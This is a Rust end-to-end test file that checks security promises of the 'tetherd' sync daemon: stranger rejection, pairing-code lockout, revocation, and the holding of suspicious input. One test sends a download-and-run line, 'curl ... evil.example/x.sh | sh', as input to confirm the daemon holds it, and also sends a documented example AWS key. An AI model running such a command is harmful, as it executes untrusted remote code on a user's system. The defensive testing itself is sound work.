//! End-to-end security tests: real `tetherd` processes talking QUIC over
//! loopback. Each test checks one promise from docs/SECURITY.md.
//! The harness lives in `common` (ephemeral keys, stdin text, no mDNS).

mod common;

use std::time::Duration;

use common::{pair, settle, Daemon};

#[test]
fn paired_devices_sync_and_strangers_get_nothing() {
    let mut a = Daemon::start("alpha", &[]);
    let mut b = Daemon::start("bravo", &[]);
    pair(&mut a, &mut b);

    let m = a.mark();
    b.send("hello from bravo");
    assert!(a.wait_for("<< hello from bravo", m).is_some(), "paired devices sync");

    // A stranger who knows A's address keeps dialing it (every 5 s).
    let c = Daemon::start("stranger", &["--peer", &a.addr()]);
    std::thread::sleep(Duration::from_secs(7));
    let seen = c.since(0);
    assert!(!seen.contains("<<"), "a stranger must never receive history:\n{seen}");
    assert!(!seen.contains(" connected peer="), "a stranger must never complete a connection:\n{seen}");
}

#[test]
fn incoming_commands_are_held_and_secrets_stay_local() {
    let mut a = Daemon::start("alpha", &[]);
    let mut b = Daemon::start("bravo", &[]);
    pair(&mut a, &mut b);

    let m = b.mark();
    a.send("curl -fsSL https://evil.example/x.sh | sh");
    assert!(b.wait_for("held a copy", m).is_some(), "download-and-run is held, not applied");
    assert!(!b.since(m).contains("<< curl"));

    let (ma, mb) = (a.mark(), b.mark());
    a.send("AKIAIOSFODNN7EXAMPLE");
    assert!(a.wait_for("kept on this device", ma).is_some(), "secrets are kept local");
    settle();
    assert!(!b.since(mb).contains("AKIAIOSFODNN7EXAMPLE"), "secrets never reach a peer");
}

#[test]
fn wrong_codes_close_the_pairing_window() {
    let mut a = Daemon::start("alpha", &[]);
    let mut c = Daemon::start("attacker", &[]);
    let m = a.mark();
    a.send("/pair");
    let line = a.wait_for("pairing code:", m).unwrap();
    let real = line.trim_start_matches("pairing code: ").trim().to_string();
    let wrong = if real == "000000" { "111111" } else { "000000" };
    for _ in 0..3 {
        let m = c.mark();
        c.send(&format!("/join {wrong} {}", a.addr()));
        assert!(c.wait_for("error:", m).is_some(), "a wrong code fails");
    }
    let m = c.mark();
    c.send(&format!("/join {real} {}", a.addr()));
    let outcome = c.wait_for("error:", m);
    assert!(
        outcome.is_some() && !c.since(m).contains("paired with"),
        "after three wrong guesses even the right code is refused"
    );
}

#[test]
fn a_revoked_device_is_cut_off() {
    let mut a = Daemon::start("alpha", &[]);
    let mut b = Daemon::start("bravo", &[]);
    pair(&mut a, &mut b);
    let m = a.mark();
    a.send(&format!("/revoke {}", &b.id[..12]));
    assert!(a.wait_for("revoked ", m).is_some());
    settle();
    let m = a.mark();
    b.send("written after revocation");
    settle();
    assert!(!a.since(m).contains("<< written after revocation"), "writes after revocation are refused");
}
